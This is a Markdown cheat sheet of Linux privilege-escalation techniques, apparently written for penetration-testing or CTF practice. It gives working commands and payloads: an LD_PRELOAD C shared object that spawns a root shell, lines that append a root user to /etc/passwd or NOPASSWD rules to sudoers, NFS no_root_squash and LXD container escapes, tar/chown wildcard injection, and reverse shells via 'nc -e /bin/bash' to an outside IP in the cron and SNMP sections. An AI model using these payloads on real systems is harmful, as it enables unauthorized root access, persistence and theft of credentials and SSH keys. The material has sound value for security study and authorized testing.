###### Network

> / / / To Finish

```bash
cat /etc/resolv.conf       # Display DNS resolver(s)
cat /etc/sysconfig/network # Displays global network settings
cat /etc/networks          # Displays network names
ifconfig                   # Displays network interface

netstat -antlup # Display all TCP,UDP listening and non-listening ports with their associated PID
```

Also check if tcpdump is available, you could maybe sniff some interesting things.

Netstat options:

- **--a**: List all listening and non-listening sockets.
- **-at**: List all TCP ports
- **-au**: List all UDP ports
- **-l**: List listening ports
- **-p**: List with PID

###### Others

```bash
# Print environment variables

###### *If you don't know, now you know: **([fstab](https://man7.org/linux/man-pages/man5/fstab.5.html)/[mtab](https://www.unix.com/man-page/v7/5/mtab/))**

The fstab file contains descriptive information about the filesystems the system can mount.
Those filesystems should be mounted at boot time.

The mtab file is about the *currently* mounted.

You could find some credentials, for instance when there is a CIFS Windows Share mounted.

#### Files Enumeration

##### Interesting Files

##### Potential credentials

```bash

find . -name "*.php" -print0 | xargs -0 grep -i -n "var $password" # Search for password in PHP file (cc Joomla)
locate password | more
```

- **.htpasswd**: used when protecting a file, folder or entire website with a password using HTTP authentication and implemented using rules within a .htaccess file.
  - **\$1$**: MD5crypt -> Mode 500
  - **\$apr1$**: md5apr1 -> Mode 1600
- **id_rsa**: SSH Private key.

  ```bash
  ssh -i id_rsa user@IP
  ./sshng2joh.py id_rsa
  john --worldlist/rockyou.txt *file.john*
  ```

- **authorized_keys**
  OpenSSL 0.9.8c-1 up to versions before 0.9.8g-9 on Debian-based operating systems uses a random number generator that generates predictable numbers, which makes it easier for remote attackers to conduct brute force guessing attacks against cryptographic keys.

  <https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md#ssh-key-predictable-prng-authorized_keys-process>

- **/etc/security/opasswd**: File with password history (pam_pwhistory).
- **.ipfs**: Means that the InterPlanetary File System5 [(IPFS](https://docs.ipfs.io/reference/cli/)) protocol (peer-to-peer network for storing and sharing data in a distributed file system) is maybe accessible

  ```bash
  ipfs refs local # List hashes of links (locally)
  ipfs ls HASH # List links from an object
  ipfs get HASH # Download IPFS objects
  ```

- **\*.jks**: repository of security certificates, either authorization certificates or public key certificates, plus corresponding private keys, used for instance in SSL encryption.

  ```bash
  keytool -list -v -keystore keystore.jks
  ```

- **.git**: cc [Files101](Files101.md)

##### Authentication Logs

The authorization Log tracks usage of authorization systems, the mechanisms for authorizing users which prompt for user passwords, such as the Pluggable Authentication Module (PAM) system, the sudo command, remote logins to sshd and so on.

There could be multiple location based on the distribution

```bash
cat /var/log/auth.log # Normally only root can see it
cat /var/log/secure
```

Keep authentication logs for both successful or failed logins, and authentication processes.

##### Misconfigured services

```bash
cat /etc/exports                     # NFS server configuration file
cat /etc/lib/nfs/etab
cat /etc/ssh/ssh_config
cat /etc/ssh/sshd_config
cat /etc/syslog.conf                 # Syslog
cat /etc/chttp.conf                  #

cat /etc/httpd/conf/httpd.conf
cat /opt/lampp/etc/httpd.conf
ls -aRl /etc/ | awk '$1 ~ /^.*r.*/' # Displays all configuration files.
```

- **/etc/exports**: Contains configurations and permissions of which folders/file systems are exported to remote users.
  -> Search for **no_root_squash**. If present, you are root of the file systems/folders with that setting
  -> Search for **anonuid** and **anonuid**. Those are the uid and gid of the anonymous account mounting the system.
  If it's set to **0**, you will be root.

  ```bash
  # 1. Place a binary in it
  cp /bin/bash /VULNERABLE_SHARE
  # 2. Mount the share
  mount -t nfs SERVER:/VULNERABLE_SHARE /mnt/
  # 3. Get root
  chown root:root bash && chmod u+s bash
  ```

- **/etc/ssh/ssh_config**:

- **/etc/ssh/sshd_config**:
  -> Search for **PermitRootLogin**, if set to **yes**, you can login as root via SSH
  -> Search for **AllowUsers** in order to enumerate the users allowed to connect using SSH

- **/etc/cups/cupsd.conf**: You could found credentials or others usefull information in it
- **/etc/printer.conf**: You could found credentials or others usefull information in it

###### *If you don't know, now you know: **[NFS Root Squashing](https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/4/html/security_guide/s2-server-nfs-noroot)**

Root squash is a technique to void privilege escalation on the client machine via suid executables Setuid. Without root squash, an attacker can generate suid binaries on the server that are executed as root on other client, even if the client user does not have superuser privileges.

Root squash is a special mapping of the remote superuser (root) identity when using identity authentication

Under root squash, a client's uid 0 (root) is mapped to 65534 (nobody).

##### All Files/Folder

```bash
find . -type d -perm -g=x 2>/dev/null
find . -perm -u=x 2>/dev/null
find / -writable ! -user `whoami` -type f ! -path "/proc/*" ! -path "/sys/*" -exec ls -al {} \; 2>/dev/null # Writable files
```

Interesting files:

- /etc/sysconfig/network-scripts/ifcfg-xxx (Centos/Redhat):
  [source](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- /etc/passwd

  ```bash
  # First generate a password with one of the following commands.
  openssl passwd -1 -salt hacker hacker
  mkpasswd -m SHA-512 hacker
  python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
  # Then add the user hacker and add the generated password.
  hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
  ```

##### Websites location enumeration

```bash
ls -alhR /var/www/
ls -alhR /srv/www/htdocs/
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/
ls -alhR /var/www/html/
```

### Getting /bin/sh

#### Quick test

```bash
# It may be allowed to simply run it
/bin/sh
# Adding /bin/sh to PATH and/or SHELL
export PATH=/bin:/usr/bin:/sbin:$PATH
export SHELL=/bin/sh
# Using chsh (Command used to change your login shell.)
chsh
/bin/bash
# Allow to copy from /bin
cp /bin/sh /current/directory; sh
```

#### Screen sessions

Screen is a terminal multiplexer, which means that it allows you to start a screen session and then open any number of windows (virtual terminals) inside that session.

```bash
screen -ls # List the current running screen
screen -r ID # Restore to a specified screen session
```

#### tmux

tmux is an open-source terminal multiplexer for Unix-like operating systems. It allows multiple terminal sessions to be accessed simultaneously in a single window.

```bash
tmux ls
ps aux | grep tmux # Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls # List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```

Here below are the command to attach to a specified session

```bash
tmux attach -d -t NAME
tmux -S /tmp/dev_sess attach -t 0
```

### Users

#### User Enumeration

```bash
lastlog # Reports the most recent login of all users
last -f /var/log/wtmp # wtmp is a file on the Linux, Solaris, and BSD operating systems that keeps a history of all logins and logouts.
ls -la /home # Enumerate users (via /home)
cat /etc/passwd # Enumerate users (via /etc/passwd)
cat /etc/passwd | egrep -e '/bin/(ba)?sh' # Enumerate users that has shell access
```

#### Group Membership Privigele Escalation

```bash
id # Print real and effective user and group IDs
```

##### Shadow

The users of the group shadow group can read the content of /etc/shadow and /etc/gshadow, containing the hashes of the passwords of other users and groups.

##### Kmem

The group kmem is able to read the content of the system memory, potentially disclosing data belonging to other processes.

##### Disk

The group **disk** can be very dangerous, since hard drives in /dev/sd\* and /dev/hd\* can be read and written bypassing any file system and any partition, allowing a normal user to disclose, alter and destroy both the partitions and the data of such drives without root privileges. Users should never belong to this group.

You can find use that vulnerability as showed below where we use a filesystem debugger to get SSH keys and the /etc/shadow content.

```bash
debugfs /dev/sda1 # Starts debugging /dev/sda1
debugfs: cd /root # Move to /root
debugfs: ls # List all files in directory
debugfs: cat /root/.ssh/id_rsa # Display SSH Keys
debugfs: cat /etc/shadow # Display username and password
```

##### Video Group

This group can be used locally to give a set of users access to a video device (like the framebuffer, the videocard or a webcam).

Application software that uses the frame buffer device (e.g. the X server) will use /dev/fb0 by default (older software uses /dev/fb0current).

Yo can then use Gimp to see the content.

```bash
w # Show who is logged on and what they are doing.
cat /dev/fb0 > /screenshot.raw # Copy the content from the first frame buffer towards screenshot.raw
cat /sys/class/graphics/fb0/virtual_size # Find the resolution of the screen
```

Then open screenshot.raw with Gimp and specify the Width and Height

<https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe#video-group>

##### ADM Group

This group allows you to view logs in /var/log.

##### Wheel Group

Any user that belongs to the group wheel can execute anything as sudo

```bash
cat /etc/sudoers
sudo su
```

##### LXD & LXC

**Linux Container (LXC)** are often considered as a lightweight virtualization technology that is something in the middle between a chroot and a completely developed virtual machine.
It creates an environment as close as possible to a Linux installation but without the need for a separate kernel.

**Linux daemon (LXD)** is the lightervisor, or lightweight container hypervisor. LXD is building on top of a container technology called LXC which was used by Docker before. It uses the stable LXC API to do all the container management behind the scene, adding the REST API on top and providing a much simpler, more consistent user experience.

When you are part of the LXD group, you can initialize the LXD process

```bash
lxd init # Initialize the LXD the process
# !!! When the "Do you want to configure a new storage pool?" appears, enter yes
# On your own machine get distrobuilder which is a system container image builder for LXC and LXD
sudo apt install -y golang-go debootstrap rsync gpg squashfs-tools # Install the requirements on your own machine
go get -d -v github.com/lxc/distrobuilder # Clone distrobuilder repo
cd $HOME/go/src/github.com/lxc/distrobuilder # Get to the make folder for distrobuilder
make # Make it

# Prepare the creation of alpine (still on your own computer)
mkdir -p $HOME/ContainerImages/alpine/
cd $HOME/ContainerImages/alpine/
wget https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml
sudo $HOME/go/bin/distrobuilder build-lxd alpine.yaml # Create the LXD container using distrobuilder
# You will have then a lxd.tar.xz file and a rootfs.squashfs file

# Upload them to the victim host
wget http://IP:PORT/lxd.tar.xz
wget http://IP:PORT/rootfs.squashfs
lxc image import lxd.tar.xz rootfs.squashfs --alias alpine # Import an image using the META file (lxd.tar.xz) and ROOTFS file (rootfs.squashfs)
lxc init alpine thomasd -c security.privileged=true # Create a container called thomasd from images alpline and give a configuration parameter to run the instance in privileged mode
lxc list # Verify that the container thomasd exist
lxc config device add thomasd host-root disk source=/ path=/mnt/root recursive=true # Add an extra device which mount "/" within the instance to the "thomasd" container  
lxc start thomasd # Run the container thomasd
lxc exec thomasd /bin/sh
#[System]:~# cd /mnt/root #Here is where the filesystem is mounted
```

#### Sudo --shell

The **/etc/shells** is a Linux / UNIX text file which contains the full pathnames of valid login shells.

```bash
su -h # Check if we can run another shell if /etc/shells allows it
cat /etc/shells
```

#### SUID & SGID

```bash
curl https://github.com/GTFOBins/GTFOBins.github.io/tree/master/_gtfobins 2>/dev/null | grep 'href="/GTFOBins/' | grep '.md">' | awk -F 'title="' '{print $2}' | cut -d '"' -f1 | cut -d "." -f1 | sed  -e 's,^,|,' | tr '\n' ' ' | tr -d "[:blank:]" #  GTFOBins.txt
```

```bash
find / -perm -u=s -type f -print 2>/dev/null # Search for program with the SUID
find / -perm -g=s -type f -print 2>/dev/null | sed 's:.*/::'  # Search for program with the SGID
```

For more information about that technique refer to [T1548.001 - Abuse Elevation Control Mechanism: Setuid and Setgid](https://attack.mitre.org/techniques/T1548/001/)

###### *If you don't know, now you know: [SUID](https://linux.die.net/man/2/setuid) & [SGID](https://linux.die.net/man/3/setgid)*

- **SUID** (**S**et owner **U**ser **ID** up on execution) is defined as giving temporary permissions to a user to run a program/file with the permissions of the file owner rather that the user who runs.
- **SGID** (**S**et owner **G**roup **ID** up on execution) same as SUID for groups.

#### Sudoers

The file /etc/sudoers and the files inside /etc/sudoers.d configure who can use sudo and how.

```bash
sudo -l # Check if they are scripts than once launch, they are run as root
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
```

##### LD_PRELOAD

**LD_PRELOAD** is an optional environmental variable containing one or more paths to shared libraries, or shared objects, that the loader will load before any other shared library including the C runtime library (libc.so) This is called preloading a library.

If output of a sudo -l shows +LD_PRELOAD on an entries, you can take advantage of it.

create the following payload

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```

Compile it, put it an a writtable directory and launch it with nano

```bash
gcc -fPIC -shared -o evil.so evil.c -nostartfiles
sudo LD_PRELOAD=evil.so nano
```

For more information about that technique refer to [T1574.006 - Hijack Execution Flow: LD_PRELOAD](https://attack.mitre.org/techniques/T1574/006/)

###### *If you don't know, now you know: [Sudoers](https://help.ubuntu.com/community/Sudoers)*

The /etc/sudoers file controls who can run what commands as what users on what machines and can also control special things such as whether you need a password for particular commands.

You can use **PASSWD** and **NOPASSWD** to specify whether the user has to enter a password or not.

### Timers

> / / / To Finish / / /

Timers are systemd unit files whose name ends in . timer that control . service files or events. Timers can be used as an alternative to cron.

```bash
systemctl list-timers --all
```

### Cron Jobs

Since Cron runs as root when executing /etc/crontab, any commands or scripts that are called by the crontab will also run as root.

```bash
crontab -l # Display all user's jobs in cron / crontab
crontab -e # Edit the current crontab using the  editor specified by the VISUAL or EDITOR environment variables.
```

Interesting cron files:

- **/etc/crontab**: System crontab. Cron will run as the **root** user when executing scripts and commands in this file.
- **/etc/anacrontab**: Cron will run as the **root** user when executing scripts and commands in this file.
*Nowadays the file is empty by default.
Originally it was usually used to run daily, weekly, monthly jobs. By default these jobs are now run through anacron which reads /etc/anacrontab configuration file.*
- **/var/spool/cron**: Directory that contains user crontables created by the crontab command.
- **/etc/cron.d:**: Directory that contains system cronjobs stored for different users.

Cron examines all stored crontabs and checks each job to see if it needs to be run in the current minute.

1. Search if there are script executed that you can write
2. Search for wildcard injection vulnerability such as tar, chown and chmod (cc Wildcard)
3. Search for execution within the script that use a folder or file that can be changed to '; nc -c bash IP PORT

#### $PATH

```bash
echo $PATH
```

If you notice '.' in environment PATH variable it means that the logged user can execute binaries/scripts from the current directory and it can be an excellent technique for an attacker to escalate root privilege.

###### *If you don't know, now you know: [PATH](https://en.wikipedia.org/wiki/PATH_(variable))*

PATH is an environmental variable in Linux and Unix-like operating systems which specifies all bin and sbin directories that hold all executable programs are stored.

When the user run any command on the terminal, its request to the shell to search for executable files with the help of PATH Variable in response to commands executed by a user.

### Wildcard

When you provide **--** followed by two spaces, it instructs the program to stop interpret command line argument.

#### Chown/Chmod file reference

Here we wil use the **--reference=FILE** parameter that use the given *file*'s owner and group rather than specifying OWNER:GROUP values.

```bash
touch -- --reference=.thomas.txt
chown -R * .txt # This wil
```

Here below is an example:

```bash
# Create:
# - One file called ".thomas.txt" that belong to me
# - One filed called "--reference=.thomas.txt" which will be used as a reference parameter

kali@kali:/example$ touch .thomas.txt
kali@kali:/example$ touch -- --reference=.thomas.txt

# You can see that all files, except the two I created belongs to root
kali@kali:/example$ ls -all
total 44
drwxrwxrwx  2 root root  4096 Nov 20 11:41  .
drwxr-xr-x 22 root root 36864 Nov 20 11:31  ..
-rw-r--r--  1 root root     0 Nov 20 11:40  file1.txt
-rw-r--r--  1 root root     0 Nov 20 11:40  file2.txt
-rw-r--r--  1 root root     0 Nov 20 11:41  file3.txt
-rw-r--r--  1 kali kali     0 Nov 20 11:41 '--reference=.thomas.txt'
-rw-r--r--  1 kali kali     0 Nov 20 11:41  .thomas.txt

# Let's connect as root and decide that ALL files within the directory
# should belong to the user and group root
root@kali:/example# chown -R root:root * 2>/dev/null

# And we can see that it took the "--reference=.thomas.txt" via the '*' and assigned all the files to the user kali
root@kali:/example# ls -all
total 44
drwxrwxrwx  2 root root  4096 Nov 20 11:41  .
drwxr-xr-x 22 root root 36864 Nov 20 11:31  ..
-rw-r--r--  1 kali kali     0 Nov 20 11:40  file1.txt
-rw-r--r--  1 kali kali     0 Nov 20 11:40  file2.txt
-rw-r--r--  1 kali kali     0 Nov 20 11:41  file3.txt
-rw-r--r--  1 kali kali     0 Nov 20 11:41 '--reference=.thomas.txt'
-rw-r--r--  1 kali kali     0 Nov 20 11:41  .thomas.txt
```

This works with chmod as well.

#### Tar arbitrary command execution

You can do the same with tar.

```bash
touch -- --checkpoint=1 # Create a file named --checkpoint=1
touch -- --checkpoint-action=exec=/bin/sh # Create a file named --checkpoint-action=exec=/bin/sh
--checkpoint=1 --checkpoint-action=action=exec=sh shell.sh # Perform shell.sh every file it go through
```

### Linux Processes

[pspy](https://github.com/DominicBreuker/pspy#how-it-works) is a command line tool designed to snoop on processes without need for root permissions. It allows you to see commands run by other users, cron jobs, etc. as they execute.
It heavily uses the [inotify API](https://man7.org/linux/man-pages/man7/inotify.7.html) provides a mechanism for monitoring filesystem events.
Inotify can be used to monitor individual files, or to monitor directories.

```bash
pspy
ps -aef --forest
top
cat /etc/services
ps aux | grep root # Displays services run by root
ps -ef | grep root # Displays services run by root
ss -lnpt # Dumps socket statistics
```

### Binaries installed

```bash
ls -alh /usr/bin/ # Displays all binaries within /usr/bin/
ls -alh /sbin/ # Displays all binaries within /sbin/
dpkg -l # Displays all Debian based packages
rpm -qa # Displays all RedHat based packages
```

### Linux Capabilities

The [getcap](https://www.man7.org/linux/man-pages/man8/getcap.8.html) command displays the name and capabilities of each specified file.
To recursively check the capabilities of all files you have access, use the following command **getcap -r / 2>/dev/null**
For instance, you can find Python or Perl that are assigned to root and you can do the following then:

```bash
./python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
./perl -e 'use POSIX (setuid); POSIX::setuid(0); exec "/bin/bash";'
```

###### *If you don't know, now you know: [Capabilities](https://linux.die.net/man/7/capabilities)*

Starting with kernel 2.2, Linux divides the privileges traditionally associated with superuser into distinct units, known as *capabilities*, which can be independently enabled and disabled. Capabilities are a per-thread attribute.

Some capabilities to look for are:

- **CAP_CHOWN**: Make arbitrary changes to file UIDs and GIDs (SUIDs and SGIDs as well)
- **CAP_DAC_OVERRID**: Bypass file read, write, and execute permission checks.
- **CAP_DAC_READ_SEARCH**: Bypass file read permission checks and directory read and execute permission checks
- **CAP_SETGID**: Make arbitrary manipulations of process GIDs and supplementary GID list
- **CAP_SETUID**: Make arbitrary manipulations of process UIDs
- **CAP_SYS_PTRACE**: Transfer data to or from the memory of arbitrary processes

### D-Bus Enumeration

**D-Bus** is an IPC mechanism initially designed to replace the software component communications systems used by the GNOME and KDE Linux desktop environments.

Each service is defined by the **objects** and **interfaces** that it exposes.

We can think of objects as instances of classes in standard OOP languages.

```bash
busctl list # List D-Bus interfaces
busctl status INTERFACE
busctl tree INTERFACE # Get Interfaces of the service object
busctl introspect INTERFACE SERVICE_OBJECT # Get methods of the interface
```

### SNMP

If you have a SNMP community with write permissions we can archive code execution by abusing the **NET-SNMP-EXTEND-MIB extension**

The Net-SNMP Agent provides an extension MIB (NET-SNMP-EXTEND-MIB) that **can be used to query arbitrary shell scripts**. To specify the shell script to run, use the extend directive in the /etc/snmp/snmpd.conf file. Once defined, the Agent will provide the exit code and any output of the command over SNMP.

In order to **extend** you in order to get a remote shell, you need to add the following to the /etc/snmp/snmpd.conf file:
extend shell /bin/nc 192.168.0.1 4444 -e /bin/bash

### Shared library

A **shared library** or **shared object** is a file that is intended to be **shared** by executable files and further shared object files.

Linux shared libraries combined with weak file permissions can be used to execute arbitrary code and compromise Linux system.

Within Linux, here below is the order where the O.S. searches for librairies:

1. Any directories specified by rpath-link options (directories specified by rpath-link options are only effective at link time)
2. Any directories specified by â€“rpath options (directories specified by rpath options are included in the executable and used at runtime)
3. LD_RUN_PATH
4. LD_LIBRARY_PATH
5. Directories in the DT_RUNPATH or DT_RPATH. (DT_RPATH entries are ignored if DT_RUNPATH entries exist
6. /lib and /usr/lib
7. Directories within /etc/ld.so.conf

If we can replace a shared library with a malicious one, thenwhen the application runs, it will load the malicious code and run it with the executing ownerâ€™s permissions.

Here below is a nice diagram from [contextis.com](https://www.contextis.com/en/blog/linux-privilege-escalation-via-dynamically-linked-shared-object-library) which shows how to test that

![Dynamic Linked Shared Object Library Diagram](Linux_Privilege_Escalation_via_Dynamically_Linked_Shared_Object_Library02.png)

```bash
# 1
ldd BINARY
# 2
objdump -x BINARY | grep RPATH
# 3
echo $LD_LIBRARY_PATH
echo $LD_RUN_PATH
objdump -x BINARY | grep RUNPATH
ls
```
